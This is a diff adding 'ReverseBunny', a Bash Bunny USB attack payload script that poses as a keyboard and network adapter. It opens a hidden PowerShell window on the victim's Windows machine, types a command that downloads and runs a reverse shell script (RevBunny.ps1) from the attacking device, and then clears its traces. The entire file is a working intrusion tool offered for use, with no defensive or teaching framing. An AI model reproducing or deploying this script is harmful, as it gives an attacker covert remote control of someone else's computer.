@@ -1,0 +1,54 @@
+#!/bin/bash
+#
+# Title:         ReverseBunny
+# Description:   Get remote access, using an obfuscated powershell reverse shell.
+# Author:        Tukru
+# Version:       2.0
+# Category:      Remote_Access
+# Attackmodes:   HID, RNDIS_ETHERNET
+
+# Define variables
+SWITCH_POSITION=""
+HOST_IP=""
+PAYLOAD_DIR="/root/udisk/payloads"
+
+# Set up LED and attack mode
+LED SETUP
+ATTACKMODE RNDIS_ETHERNET HID
+
+# Get switch position and host IP
+GET SWITCH_POSITION
+GET HOST_IP
+
+# Change to payload directory for current switch position
+cd "$PAYLOAD_DIR/$SWITCH_POSITION"
+
+# Start server and block outgoing DNS requests
+LED SPECIAL
+iptables -A OUTPUT -p udp --dport 53 -j DROP
+python -m http.server 80 &>/dev/null &
+
+# Wait for server to start listening on port 80
+while ! nc -z localhost 80; do sleep 0.2; done
+
+# Open hidden powershell instance
+Q DELAY 1500
+Q GUI r
+Q DELAY 500
+Q STRING "powershell -nop -win hidden"
+Q DELAY 500
+Q ENTER
+
+# Download and execute reverse shell script
+Q DELAY 500
+Q STRING "\$I='$HOST_IP';\$P=4444;"
+Q DELAY 250
+Q STRING "iex (New-Object Net.WebClient).DownloadString(\"http://$HOST_IP/RevBunny.ps1\")"
+Q DELAY 400
+Q ENTER
+
+# Finish and cleanup
+LED FINISH
+iptables -D OUTPUT -p udp --dport 53 -j DROP &>/dev/null
+pkill -f "python -m http.server 80" &>/dev/null
+                                                     
